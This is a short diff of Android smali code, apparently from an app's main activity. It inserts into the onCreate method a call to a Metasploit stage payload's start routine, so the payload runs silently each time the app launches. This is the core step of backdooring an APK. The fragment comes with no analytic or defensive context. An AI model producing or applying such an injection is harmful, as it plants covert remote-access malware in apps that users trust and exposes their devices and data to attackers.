@@ -37,6 +37,7 @@
 
 # virtual methods
 .method public onCreate(Landroid/os/Bundle;)V
+     invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
     .locals 2
     .annotation build Landroid/annotation/SuppressLint;
         value = {
